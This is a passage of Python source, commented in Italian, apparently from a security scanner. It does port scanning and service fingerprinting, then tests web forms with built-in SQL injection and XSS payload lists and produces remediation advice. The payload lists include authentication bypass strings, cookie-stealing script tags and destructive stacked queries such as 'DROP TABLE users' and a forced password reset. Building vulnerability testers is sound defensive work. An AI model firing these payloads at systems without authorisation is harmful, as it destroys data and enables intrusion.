            protocol: Protocollo
            banner: Banner ricevuto
            
        Returns:
            Dict con informazioni di versione se trovate
        """
        version_patterns = {
            'HTTP': r'Server: ([^\r\n]+)',
            'SSH': r'SSH-2.0-([^\r\n]+)',
            'FTP': r'^220[\s-]([^\r\n]+)',
            'SMTP': r'^220[\s-]([^\r\n]+)',
            'POP3': r'^+OK[\s-]([^\r\n]+)',
            'IMAP': r'^\* OK[\s-]([^\r\n]+)'
        }
        
        if protocol in version_patterns:
            match = re.search(version_patterns[protocol], banner)
            if match:
                return {
                    'raw_version': match.group(1),
                    'protocol': protocol,
                    'banner_full': banner
                }
        return None

    async def scan_with_custom_payload(self, target: str, port: int, payload: bytes, timeout: float = 2.0) -> Dict:
        """
        Esegue una scansione con payload personalizzato in modo asincrono.

        Args:
            target: Host target
            port: Porta da scansionare
            payload: Payload da inviare
            timeout: Timeout in secondi

        Returns:
            Dict con risultati della scansione
        """
        results = {
            'port': port,
            'custom_payload': payload.hex(),
            'response': None,
            'error': None
        }

        try:
            # Connessione asincrona con timeout
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=timeout
            )

            # Invia payload
            writer.write(payload)
            await writer.drain()  # Assicura che il payload sia inviato

            # Riceve la risposta
            response = await reader.read(2048)  # Legge fino a 2048 byte
            if response:
                results['response'] = {
                    'hex': response.hex(),
                    'ascii': response.decode('ascii', errors='ignore'),
                    'utf8': response.decode('utf-8', errors='ignore')
                }

        except asyncio.TimeoutError:
            results['error'] = f"Timeout dopo {timeout} secondi"

        except ConnectionRefusedError:
            results['error'] = "Connessione rifiutata"

        except Exception as e:
            results['error'] = str(e)

        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass  # Se la connessione è già chiusa, evita errori

        return results

    def _generate_recommendations(self, findings: List[str]) -> List[str]:
        """
        Genera raccomandazioni basate sui findings
        
        Args:
            findings: Lista di problemi trovati
            
        Returns:
            Lista di raccomandazioni
        """
        recommendations = []
        
        # Mapping problemi -> raccomandazioni
        recommendation_map = {
            'Certificato scaduto': [
                'Rinnovare immediatamente il certificato SSL/TLS',
                'Implementare monitoraggio automatico scadenza certificati',
                'Considerare l\'uso di Let\'s Encrypt per rinnovo automatico'
            ],
            'Certificato in scadenza': [
                'Pianificare il rinnovo del certificato',
                'Implementare alert per scadenza certificati'
            ],
            'Versione SSL/TLS obsoleta': [
                'Aggiornare alla versione più recente di SSL/TLS',
                'Disabilitare protocolli obsoleti (SSL 3.0, TLS 1.0, TLS 1.1)',
                'Configurare cipher suite sicure'
            ],
            'HSTS non configurato': [
                'Implementare HTTP Strict Transport Security',
                'Configurare max-age appropriato (suggerito: 1 anno)'
            ],
            'Protezione clickjacking non configurata': [
                'Implementare X-Frame-Options header',
                'Considerare l\'uso di Content Security Policy'
            ],
            'MIME-sniffing non protetto': [
                'Aggiungere X-Content-Type-Options: nosniff header'
            ],
            'Protezione XSS non configurata': [
                'Implementare X-XSS-Protection header',
                'Considerare l\'uso di Content Security Policy'
            ],
            'CSP non configurato': [
                'Implementare Content Security Policy',
                'Iniziare con policy restrittiva e allentare se necessario'
            ],
            'Cookie non sicuri': [
                'Aggiungere flag Secure a tutti i cookie',
                'Aggiungere flag HttpOnly dove possibile',
                'Considerare l\'uso di SameSite=Strict'
            ]
        }
        
        for finding in findings:
            for pattern, recs in recommendation_map.items():
                if pattern.lower() in finding.lower():
                    recommendations.extend(recs)
                    
        return list(set(recommendations))  # Rimuove duplicati

    async def intelligent_port_scan(self, target: str) -> Dict:
        """
        Esegue una scansione intelligente che adatta la strategia in base ai risultati
        
        Args:
            target: Host target
            
        Returns:
            Dict con risultati della scansione
        """
        results = {
            'target': target,
            'scan_phases': [],
            'ports_found': [],
            'services_identified': [],
            'potential_vulnerabilities': []
        }
        
        try:
            # Fase 1: Quick scan delle porte più comuni
            self.logger.info("Fase 1: Quick scan porte comuni")
            common_ports_result = await self.quick_scan(target)
            results['scan_phases'].append({
                'phase': 'quick_scan',
                'ports_found': len(common_ports_result['ports'])
            })
            
            # Se troviamo porte aperte, approfondiamo l'analisi
            if common_ports_result['ports']:
                # Fase 2: Fingerprinting dei servizi trovati
                self.logger.info("Fase 2: Service fingerprinting")
                for port_info in common_ports_result['ports']:
                    port = port_info['port']
                    service_details = await self.fingerprint_service(target, port)
                    results['services_identified'].append({
                        'port': port,
                        'service': service_details
                    })
                    
                    # Analisi vulnerabilità se troviamo un servizio identificabile
                    if service_details.get('banner'):
                        vulns = await self._check_known_vulnerabilities(
                            target, port, service_details['banner']
                        )
                        if vulns:
                            results['potential_vulnerabilities'].extend(vulns)
                            
                # Fase 3: Scan porte vicine a quelle trovate aperte
                self.logger.info("Fase 3: Scanning porte adiacenti")
                for port_info in common_ports_result['ports']:
                    port = port_info['port']
                    # Scan 5 porte prima e dopo ogni porta aperta trovata
                    start_port = max(1, port - 5)
                    end_port = min(65535, port + 5)
                    adjacent_results = await self.scan_target(target, start_port, end_port)
                    results['ports_found'].extend(adjacent_results.get('ports', []))
                    
            # Fase 4: Scan casuale di porte in altri range se abbiamo trovato poco
            if len(results['ports_found']) < 5:
                self.logger.info("Fase 4: Scanning random porte aggiuntive")
                random_ports = random.sample(range(1024, 65535), 100)  # Scan 100 porte random
                random_results = []
                for port in random_ports:
                    port_result = await self.scan_port(target, port)
                    if port_result:
                        random_results.append(port_result)
                results['scan_phases'].append({
                    'phase': 'random_scan',
                    'ports_found': len(random_results)
                })
                results['ports_found'].extend(random_results)
                
        except Exception as e:
            self.logger.error(f"Errore durante intelligent scan: {str(e)}")
            results['error'] = str(e)
            
        return results

    async def adaptive_scan(self, target: str, aggressiveness: int = 1) -> Dict:
        """
        Esegue una scansione che si adatta in base all'host target e al livello di aggressività
        
        Args:
            target: Host target
            aggressiveness: Livello di aggressività (1-5)
            
        Returns:
            Dict con risultati della scansione
        """
        scan_config = {
            'timeout': max(0.1, 1.0 / aggressiveness),
            'max_retries': aggressiveness,
            'concurrent_scans': min(100, 20 * aggressiveness),
            'port_groups': []
        }
        
        # Configura gruppi di porte basati sull'aggressività
        if aggressiveness == 1:
            scan_config['port_groups'] = [
                (1, 1024)  # Solo porte well-known
            ]
        elif aggressiveness == 2:
            scan_config['port_groups'] = [
                (1, 1024),
                (1024, 2048)
            ]
        elif aggressiveness == 3:
            scan_config['port_groups'] = [
                (1, 1024),
                (1024, 10000),
                (10000, 20000)
            ]
        elif aggressiveness == 4:
            scan_config['port_groups'] = [
                (1, 1024),
                (1024, 10000),
                (10000, 30000),
                (30000, 50000)
            ]
        else:  # aggressiveness == 5
            scan_config['port_groups'] = [
                (1, 65535)  # Full scan
            ]
            
        results = {
            'target': target,
            'scan_config': scan_config,
            'phases': []
        }
        
        try:
            # Test iniziale di risposta
            initial_response = await self._test_target_response(target)
            if not initial_response['is_responsive']:
                scan_config['timeout'] *= 2  # Aumenta timeout se host lento
                
            # Scan per ogni gruppo di porte
            for start_port, end_port in scan_config['port_groups']:
                phase_result = await self.scan_target(
                    target,
                    start_port,
                    end_port,
                    timeout=scan_config['timeout'],
                    concurrent_scans=scan_config['concurrent_scans']
                )
                
                results['phases'].append({
                    'port_range': (start_port, end_port),
                    'ports_found': len(phase_result.get('ports', [])),
                    'scan_time': phase_result.get('scan_time')
                })
                
                # Adatta la configurazione in base ai risultati
                if phase_result.get('ports'):
                    # Se troviamo molte porte, aumentiamo la concorrenza
                    scan_config['concurrent_scans'] = min(
                        scan_config['concurrent_scans'] * 1.5,
                        200
                    )
                    
            # Analisi finale
            total_ports_found = sum(phase['ports_found'] for phase in results['phases'])
            results['summary'] = {
                'total_ports_found': total_ports_found,
                'scan_coverage': sum(
                    end - start + 1 
                    for start, end in scan_config['port_groups']
                ),
                'adaptive_changes': {
                    'final_timeout': scan_config['timeout'],
                    'final_concurrent_scans': scan_config['concurrent_scans']
                }
            }
            
        except Exception as e:
            self.logger.error(f"Errore durante adaptive scan: {str(e)}")
            results['error'] = str(e)
            
        return results

    async def _test_target_response(self, target: str) -> Dict:
        """
        Testa la responsività dell'host target
        
        Args:
            target: Host target
            
        Returns:
            Dict con risultati del test
        """
        results = {
            'is_responsive': False,
            'average_response': 0,
            'packet_loss': 0
        }
        
        try:
            # Test ICMP
            ping_responses = []
            for _ in range(3):
                start_time = time.time()
                is_alive = await self._is_host_alive(target)
                response_time = time.time() - start_time
                
                if is_alive:
                    ping_responses.append(response_time)
                    
            results['is_responsive'] = bool(ping_responses)
            if ping_responses:
                results['average_response'] = sum(ping_responses) / len(ping_responses)
                results['packet_loss'] = (3 - len(ping_responses)) / 3 * 100
                
        except Exception as e:
            self.logger.error(f"Errore nel test di risposta: {str(e)}")
            
        return results

    def get_service_recommendations(self, port: int, service_info: Dict) -> List[str]:
        """
        Genera raccomandazioni specifiche per un servizio
        
        Args:
            port: Numero porta
            service_info: Informazioni sul servizio
            
        Returns:
            Lista di raccomandazioni
        """
        recommendations = []
        
        # Raccomandazioni generali basate sulla porta
        if port < 1024:
            recommendations.append(
                "Considerare l'uso di porte non privilegiate se possibile"
            )
            
        # Raccomandazioni specifiche per servizio
        service = service_info.get('service', '').lower()
        
        if 'http' in service:
            recommendations.extend([
                "Implementare HTTPS con certificato valido",
                "Configurare security headers appropriati",
                "Implementare rate limiting",
                "Considerare l'uso di WAF"
            ])
            
        elif 'ftp' in service:
            recommendations.extend([
                "Sostituire FTP con SFTP o FTPS",
                "Implementare strong authentication",
                "Limitare accesso a IP specifici",
                "Configurare permessi restrittivi"
            ])
            
        elif 'ssh' in service:
            recommendations.extend([
                "Utilizzare solo SSHv2",
                "Disabilitare accesso root",
                "Implementare autenticazione a chiave",
                "Configurare AllowUsers/DenyUsers"
            ])
            
        elif 'sql' in service:
            recommendations.extend([
                "Bloccare accesso diretto da internet",
                "Utilizzare strong authentication",
                "Implementare encryption",
                "Configurare firewall database"
            ])
            
        # Raccomandazioni basate sul rischio
        risk_level = service_info.get('risk', '').lower()
        if 'alto' in risk_level or 'critico' in risk_level:
            recommendations.extend([
                "Verificare necessità del servizio",
                "Implementare monitoring attivo",
                "Configurare alert per attività sospette"
            ])
            
        return list(set(recommendations))  # Rimuove duplicati

    def save_scan_results(self, results: Dict, filename: str) -> None:
        """
        Salva i risultati della scansione in un file
        
        Args:
            results: Risultati della scansione
            filename: Nome del file
        """
        try:
            # Determina il formato dal nome del file
            format_type = filename.split('.')[-1].lower()
            
            if format_type == 'json':
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(results, f, indent=4)
                    
            elif format_type == 'html':
                report_html = self.format_results(results, 'html')
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(report_html)
                    
            elif format_type in ['txt', 'text']:
                report_text = self.format_results(results, 'text')
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(report_text)
                    
            elif format_type == 'csv':
                self._save_as_csv(results, filename)
                
            else:
                raise ValueError(f"Formato file non supportato: {format_type}")
                
            self.logger.info(f"Risultati salvati in: {filename}")
            
        except Exception as e:
            self.logger.error(f"Errore nel salvataggio risultati: {str(e)}")
            raise

    def _save_as_csv(self, results: Dict, filename: str) -> None:
        """
        Salva i risultati in formato CSV
        
        Args:
            results: Risultati della scansione
            filename: Nome del file CSV
        """
        try:
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                
                # Scrivi header
                writer.writerow([
                    'Port', 'Service', 'State', 'Risk', 'Description',
                    'Banner', 'Version', 'Process', 'Vulnerabilities'
                ])
                
                # Scrivi dati
                for port_info in results.get('ports', []):
                    vulnerabilities = '; '.join(
                        v['description'] for v in port_info.get('vulnerabilities', [])
                    )
                    
                    writer.writerow([
                        port_info['port'],
                        port_info.get('service', 'N/A'),
                        port_info.get('state', 'N/A'),
                        port_info.get('risk', 'N/A'),
                        port_info.get('description', 'N/A'),
                        port_info.get('banner', 'N/A'),
                        port_info.get('version', 'N/A'),
                        port_info.get('process_info', {}).get('name', 'N/A'),
                        vulnerabilities
                    ])
                    
        except Exception as e:
            self.logger.error(f"Errore nel salvataggio CSV: {str(e)}")
            raise




































# Definisci la nuova eccezione personalizzata (aggiungi questo codice prima della classe WebSecurityTester)
class RateLimitExceeded(Exception):
    """Eccezione sollevata quando viene superato il rate limit"""
    def __init__(self, message: str = "Rate limit exceeded"):
        self.message = message
        super().__init__(self.message)
  
class SafeRequestHandler:
    """Gestore centralizzato per richieste HTTP sicure"""
    def __init__(self, max_retries: int = 3, timeout: int = 10):
        self.max_retries = max_retries
        self.timeout = timeout
        self.session = requests.Session()
        self.logger = logging.getLogger(__name__)

    def safe_request(self, method: str, url: str, **kwargs) -> requests.Response:
        """
        Esegue una richiesta HTTP con retry e gestione errori avanzata.
        """
        kwargs.setdefault('timeout', self.timeout)

        for attempt in range(self.max_retries):
            try:
                response = self.session.request(method, url, **kwargs)

                if response.status_code == 429:  # Too Many Requests
                    raise RateLimitExceeded(f"Rate limit exceeded for {url}")

                response.raise_for_status()
                return response

            except requests.exceptions.RequestException as e:
                self.logger.warning(f"Tentativo {attempt + 1}/{self.max_retries} fallito per {url}: {str(e)}")

                if attempt == self.max_retries - 1:
                    self.logger.error(f"Tutti i tentativi falliti per {url}")
                    return None  # <-- Evita il crash, ritorna None invece di far esplodere tutto


                # Exponential backoff con tempo massimo di attesa
                sleep_time = min(2 ** attempt, 30)
                time.sleep(sleep_time)

        raise RuntimeError("Unexpected code path - Questo errore non dovrebbe mai verificarsi")

class WebSecurityTester(BaseModule):
    def __init__(self):
        super().__init__()
    
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'DNT': '1'
        }
        self.timeout = 10
        self.max_redirects = 3
        self.verify_ssl = True
        self.request_handler = requests.Session()

        # Rate limiting
        self.rate_limits = {}
        self.RATE_LIMIT_REQUESTS = 50  # Numero massimo di richieste
        self.RATE_LIMIT_WINDOW = 60    # Finestra temporale in secondi
        self.rate_limit_lock = threading.Lock()
        self.MAX_RETRIES = 3

        # Payload avanzati
        self.sql_payloads = self._initialize_sql_payloads()
        self.xss_payloads = self._initialize_xss_payloads()
        self.error_patterns = self._initialize_error_patterns()
    
    def _is_rate_limited(self, target: str) -> bool:
        current_time = time.time()
        with self.rate_limit_lock:
            # Pulizia vecchi record con controllo chiavi
            self.rate_limits = {k: v for k, v in self.rate_limits.items()
                                if 'timestamp' in v and current_time - v['timestamp'] < self.RATE_LIMIT_WINDOW}

            if target not in self.rate_limits:
                self.rate_limits[target] = {'count': 1, 'timestamp': current_time}
                return False

            if self.rate_limits[target]['count'] >= self.RATE_LIMIT_REQUESTS:
                self.rate_limits[target]['timestamp'] = current_time  # 🔥 AGGIORNATO: Non blocca per sempre
                return True

            self.rate_limits[target]['count'] += 1
            return False

    
    def _print_progress(self, current: int, total: int) -> None:
        """
        Stampa la barra di avanzamento per i test.
        Evita crash se total = 0.
        """
        if total == 0:
            print("\rProgresso: [----------------------------------------] 0.0%", end='')
            return

        progress = (current / total) * 100
        bar_length = 40
        filled_length = int(bar_length * current // total)
        bar = '=' * filled_length + '-' * (bar_length - filled_length)
        print(f'\rProgresso: [{bar}] {progress:.1f}%', end='')



    def _initialize_sql_payloads(self) -> Dict[str, List[str]]:
        """Inizializza i payload per SQL injection suddivisi per categoria"""
        return {
            'authentication_bypass': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR '1'='1' #",
                "admin' --",
                "admin' #",
                "admin'/*",
                "') OR ('1'='1",
                "')) OR (('1'='1"
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "') UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version --",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns--"
            ],
            'error_based': [
                "' AND 1=convert(int,@@version)--",
                "' AND 1=cast((SELECT @@version) as int)--",
                "' AND 1=convert(int,(SELECT @@version))--",
                "' AND 1=convert(int,user_name())--",
                "' AND 1=convert(int,db_name())--",
                "' AND 1=convert(int,system_user)--"
            ],
            'blind_boolean': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "') AND ('a'='a",
                "') AND ('a'='b"
            ],
            'blind_time': [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SLEEP(5)--",
                "' AND SLEEP(5)--",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', 5)--",
                "' AND pg_sleep(5)--",
                "' SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--"
            ],
            'stacked_queries': [
                "'; INSERT INTO users VALUES ('hacker','password')--",
                "'; DROP TABLE users--",
                "'; DELETE FROM users--",
                "'; UPDATE users SET password='hacked'--",
                "'; TRUNCATE TABLE users--"
            ]
        }

    def _initialize_xss_payloads(self) -> Dict[str, List[str]]:
        """Inizializza i payload per XSS suddivisi per categoria"""
        return {
            'basic': [
                "<script>alert('XSS')</script>",
                "<script>alert(document.domain)</script>",
                "<script>alert(document.cookie)</script>",
                "<script>alert(document.location)</script>"
            ],
            'img_based': [
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onerror=alert(document.cookie)>",
                "<img src=x oneonerrorrror=alert(document.domain)>",
                "<img src=x onerror=alert(document.location)>"
            ],
            'svg_based': [
                "<svg onload=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<svg onload=alert(document.domain)>",
                "<svg><script>alert('XSS')</script></svg>"
            ],
            'event_handlers': [
                "<body onload=alert('XSS')>",
                "<input type=text onmouseover=alert('XSS')>",
                "<iframe onload=alert('XSS')>",
                "<object onerror=alert('XSS')>"
            ],
            'encoding_bypass': [
                "<scr%00ipt>alert('XSS')</scr%00ipt>",
                "<scr\x00ipt>alert('XSS')</scr\x00ipt>",
                "<scr\x20ipt>alert('XSS')</scr\x20ipt>",
                "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
            ],
            'dom_based': [
                "<script>eval(location.hash.slice(1))</script>#alert('XSS')",
                "<script>document.write(location.hash);</script>#<img src=x onerror=alert('XSS')>",
                "<script>eval(atob(location.hash.slice(1)))</script>#YWxlcnQoJ1hTUycpOw=="
            ]
        }

    def _initialize_error_patterns(self) -> Dict[str, List[str]]:
        """Inizializza i pattern di errore da cercare nelle risposte"""
        return {
            'sql': [
            r'sql', r'mysql', r'sqlite', r'postgresql', r'oracle',
            r'odbc', r'sybase', r'database', r'db', r'warning',
            r'error', r'invalid', r'syntax', r'unexpected', r'query',
            r'failed', r'stack trace', r'violation', r'exception',
            r'ORA-', r'SQL Server', r'MySQL', r'PostgreSQL'
        ],
        'xss': [
            r'<script>', r'</script>', r'alert\(', r'onerror=',
            r'onload=', r'eval\(', r'javascript:', r'document\.',
            r'window\.', r'fromCharCode', r'String\.', r'document.cookie'
        ]
    }



    def _prepare_request_params(self, payload: str, params: Dict, data: Dict, method: str) -> Tuple[Dict, Dict]:
        """Prepara e valida i parametri della richiesta"""
        test_params = {k: v for k, v in (params or {}).items()}
        test_data = {k: v for k, v in (data or {}).items()}
    
        # Test tutti i parametri possibili, non solo 'id'
        if method.upper() == 'GET':
            for param in test_params.keys():
                test_params[param] = payload
        else:
            for param in test_data.keys():
                test_data[param] = payload
            
        return test_params, test_data

    def _analyze_response_patterns(self, response_text: str, payload: str) -> List[Dict]:
        """Analizza pattern di risposta avanzati"""
        patterns = []
    
        # Database error patterns più specifici
        db_errors = {
            'mysql': [
                'sql syntax.*mysql', 'warning.*mysql', 'mysql.*error', 'valid mysql result',
                'check the manual that corresponds to your mysql server version',
                'unknown column .* in .field list.'
            ],
            'postgresql': [
                'postgresql.*error', 'pg_.*error', 'valid postgresql result',
                'Npgsql.', 'PG::.*error'
            ],
            'microsoft': [
                'microsoft.*database.*error', 'odbc.*error', 'microsoft sql server',
                'OLE DB.*error', 'warning.*mssql', 'driver.*sql.*server'
            ],
            'oracle': [
                'oracle.*error', 'oracle.*driver', 'ORA-[0-9][0-9][0-9][0-9]',
                'quoted string not properly terminated'
            ],
            'sqlite': [
                'sqlite.*error', 'sqlite3.*error', 'warning.*sqlite',
                'sqlite_.*error', 'SQLite/JDBCDriver'
            ]
        }
    
        for db, error_list in db_errors.items():
            for error in error_list:
                if re.search(error, response_text, re.IGNORECASE):
                    patterns.append({
                        'type': 'database_error',
                        'database': db,
                        'pattern': error,
                        'confidence': 0.9
                    })
    
        return patterns

    def _deduplicate_vulnerabilities(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """
        Rimuove le vulnerabilità duplicate basandosi sull'URL, tipo e payload.
        """
        unique_vulnerabilities = {}
        
        for vuln in vulnerabilities:
            key = (vuln['type'], vuln.get('payload', ''), vuln.get('category', ''))
            if key not in unique_vulnerabilities:
                unique_vulnerabilities[key] = vuln
        
        return list(unique_vulnerabilities.values())

    def test_sql_injection(self, url: str, params: Optional[Dict] = None,  
                      method: str = 'GET', data: Optional[Dict] = None,
                      custom_payloads: Optional[List[str]] = None,
                      scan_level: str = 'normal') -> Dict:
        """Versione migliorata del test SQL injection"""

        if not url.startswith(('http://', 'https://')):
            raise ValueError("URL must start with http:// or https://")

        target = urlparse(url).netloc
        if self._is_rate_limited(target):
            raise RateLimitExceeded(f"Rate limit exceeded for {target}")

        vulnerabilities = []
        test_results = defaultdict(list)
        error_messages = set()

        with requests.Session() as session:
            session.headers.update(self.headers)
            session.verify = self.verify_ssl

            all_payloads = [(p, c) for c, p_list in self.sql_payloads.items() for p in p_list]
            if custom_payloads:
                all_payloads.extend([(p, 'custom') for p in custom_payloads])

            total_tests = len(all_payloads)

            try:
                baseline_params, baseline_data = self._prepare_request_params("dummy", params, data, method)
                baseline_response = session.request(
                    method=method.upper(),
                    url=url,
                    params=baseline_params,
                    data=baseline_data,
                    timeout=self.timeout
                )
                baseline_length = len(baseline_response.text)
                baseline_time = baseline_response.elapsed.total_seconds()
            except Exception as e:
                self._log_error(f"Error during baseline request: {str(e)}")
                return {'error': str(e)}

            for index, (payload, category) in enumerate(all_payloads, 1):
                try:
                    test_params, test_data = self._prepare_request_params(payload, params, data, method)
                
                    for attempt in range(3):  # 3 tentativi
                        try:
                            response = session.request(
                                method=method.upper(),
                                url=url,
                                params=test_params,
                                data=test_data,
                                timeout=self.timeout
                            )
                            break
                        except requests.RequestException as e:
                            self._log_warning(f"Tentativo {attempt + 1}/3 fallito con payload '{payload}': {str(e)}")
                            if attempt == 2:
                                raise
                            time.sleep(1)

                    response_text = response.text.lower()
                    response_time = response.elapsed.total_seconds()

                    db_patterns = self._analyze_response_patterns(response_text, payload)
                    for pattern in db_patterns:
                        vulnerabilities.append({
                            'type': 'error_based',
                            'payload': payload,
                            'category': category,
                            'database': pattern['database'],
                            'pattern': pattern['pattern'],
                            'confidence': pattern['confidence'],
                            'details': f"Database error detected: {pattern['pattern']}"
                        })

                    if response_time > (baseline_time * 5) and 'time_based' in category:
                        vulnerabilities.append({
                            'type': 'time_based',
                            'payload': payload,
                            'category': category,
                            'response_time': response_time,
                            'baseline_time': baseline_time,
                            'confidence': 0.8,
                            'details': f"Time-based SQL injection possible (response: {response_time}s, baseline: {baseline_time}s)"
                        })

                    content_diff = abs(len(response.text) - baseline_length)
                    if content_diff > 500:
                        vulnerabilities.append({
                            'type': 'content_based',
                            'payload': payload,
                            'category': category,
                            'content_difference': content_diff,
                            'confidence': 0.7,
                            'details': f"Significant response size difference detected: {content_diff} bytes"
                        })

                    test_results[category].append({
                        'payload': payload,
                        'response_time': response_time,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'content_difference': content_diff,
                        'patterns_found': db_patterns
                    })
                
                except Exception as e:
                    self._log_error(f"Error testing payload {payload}: {str(e)}")
                    continue
            
                self._print_progress(index, total_tests)

        unique_vulns = self._deduplicate_vulnerabilities(vulnerabilities)

        return {
            'url_tested': url,
            'total_tests': total_tests,
            'vulnerabilities_found': len(unique_vulns),
            'error_messages': list(error_messages),
            'results_by_category': dict(test_results),
            'vulnerabilities': unique_vulns,
            'recommendations': self._generate_sql_recommendations(unique_vulns)
        }
    
    def _detect_sql_vulnerabilities(self, response_text: str, payload: str) -> bool:
        """Analizza i pattern di errore per SQL Injection"""
        sql_errors = [
            re.escape(error) for error in [
                "SQL syntax", "MySQL error", "PostgreSQL error",
                "Warning: mysql_", "ODBC SQL Server Driver"
            ]
        ]
        for error in sql_errors:
            if re.search(error, response_text, re.IGNORECASE):
                return True
        return False

    def test_xss(self, url: str, params: Optional[Dict] = None,
                method: str = 'GET', data: Optional[Dict] = None,
                custom_payloads: Optional[List[str]] = None) -> Dict:
        """
        Esegue test approfonditi di XSS
        
        Args:
            url: URL da testare
            params: Parametri GET opzionali
            method: Metodo HTTP (GET/POST)
            data: Dati POST opzionali
            custom_payloads: Payload personalizzati aggiuntivi
            
        Returns:
            Dict con risultati dei test e vulnerabilità trovate
        """
        vulnerabilities = []
        test_results = defaultdict(list)
        reflected_content = set()
        
        # Log inizio test
        self._log_info(f"Iniziando test XSS su {url}")
        print(f"\nTest XSS in corso su {url}")
        print("Questo test può richiedere alcuni minuti...")
        
        # Unisci tutti i payload da testare
        all_payloads = []
        for category, payloads in self.xss_payloads.items():
            all_payloads.extend([(payload, category) for payload in payloads])
        if custom_payloads:
            all_payloads.extend([(payload, 'custom') for payload in custom_payloads])
        
        total_tests = len(all_payloads)
        
        for index, (payload, category) in enumerate(all_payloads, 1):
            try:
                # Mostra progresso
                progress = (index / total_tests) * 100
                print(f"\rProgresso: [{index}/{total_tests}] {progress:.1f}%", end='')
                
                # Prepara la richiesta
                test_params = {k: v for k, v in (params or {}).items()}
                test_data = {k: v for k, v in (data or {}).items()}
                
                # Inietta il payload
                if method.upper() == 'GET':
                    test_params['q'] = payload
                else:
                    test_data['q'] = payload
                
                # Esegui la richiesta in modo sicuro con SafeRequestHandler
                response = self.request_handler.request(
                    method=method.upper(),
                    url=url,
                    params=test_params,
                    data=test_data,
                    headers=self.headers,
                    allow_redirects=True,
                    verify=self.verify_ssl
                )   

                
                # Analizza la risposta
                response_text = response.text
                
                # Cerca payload riflesso
                if payload.lower() in response_text.lower():
                    reflected_content.add(payload)
                    vulnerabilities.append({
                        'type': 'reflected',
                        'payload': payload,
                        'category': category,
                        'details': "Payload riflesso nella risposta"
                    })
                
                # Cerca pattern specifici XSS
                for pattern in self.error_patterns['xss']:
                  if pattern in response_text.lower():
                     vulnerabilities.append({
                          'type': 'pattern_match',
                           'payload': payload,
                            'category': category,
                            'pattern': pattern,
                            'details': f"Pattern XSS '{pattern}' trovato nella risposta"
                    })

                # Salva risultati per categoria
                test_results[category].append({
                    'payload': payload,
                    'response_time': response.elapsed.total_seconds(),
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'payload_reflected': payload.lower() in response_text.lower()
                })
                
            except Exception as e:
                self._log_error(f"Errore durante test con payload {payload}: {str(e)}")
                continue
        
        print("\nAnalisi risultati in corso...")
        
        # Analisi risultati
        analysis = {
            'url_tested': url,
            'total_tests': total_tests,
            'vulnerabilities_found': len(vulnerabilities),
            'reflected_content': list(reflected_content),
            'results_by_category': dict(test_results),
            'vulnerabilities': vulnerabilities,
            'recommendations': self._generate_xss_recommendations(vulnerabilities)
        }
        
        return analysis

    def _generate_sql_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Genera raccomandazioni basate sulle vulnerabilità SQL trovate"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            if vuln['type'] == 'error_based':
                recommendations.add(
                    "Disabilitare i messaggi di errore dettagliati in produzione e " +
                    "implementare un corretto handling degli errori"
                )
                recommendations.add(
                    "Utilizzare prepared statements o ORM per le query SQL invece " +
                    "di concatenare stringhe"
                )
                
            elif vuln['type'] == 'time_based':
                recommendations.add(
                    "Implementare timeout delle query e limitare le risorse del database"
                )
                recommendations.add(
                    "Monitorare e loggare query che impiegano tempo eccessivo"
                )
                
            if 'UNION' in vuln.get('payload', ''):
                recommendations.add(
                    "Limitare i privilegi dell'utente database e implementare " +
                    "white-listing delle colonne accessibili"
                )
            
            if 'information_schema' in vuln.get('payload', ''):
                recommendations.add(
                    "Restringere l'accesso alle tabelle di sistema e implementare " +
                    "una corretta separazione dei privilegi"
                )
        
        # Raccomandazioni generali
        recommendations.update([
            "Implementare WAF (Web Application Firewall) per filtrare input malevoli",
            "Utilizzare sempre prepared statements o ORM per le query database",
            "Validare e sanificare tutti gli input utente",
            "Implementare rate limiting per prevenire attacchi automatizzati",
            "Mantenere aggiornati tutti i componenti del sistema"
        ])
        
        return list(recommendations)

    def _generate_xss_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Genera raccomandazioni basate sulle vulnerabilità XSS trovate"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            if vuln['type'] == 'reflected':
                recommendations.add(
                    "Implementare encoding HTML per tutti i dati riflessi nelle pagine"
                )
                recommendations.add(
                    "Utilizzare Content Security Policy (CSP) per limitare l'esecuzione di script"
                )
                
            if 'script' in vuln.get('payload', '').lower():
                recommendations.add(
                    "Filtrare o encodare caratteri speciali come <, >, \", '"
                )
                
            if 'onerror' in vuln.get('payload', '').lower() or 'onload' in vuln.get('payload', '').lower():
                recommendations.add(
                    "Rimuovere o sanitizzare attributi event handler pericolosi"
                )
                
            if 'eval' in vuln.get('payload', '').lower():
                recommendations.add(
                    "Evitare l'uso di eval() e funzioni simili che eseguono stringhe come codice"
                )
        
        # Raccomandazioni generali
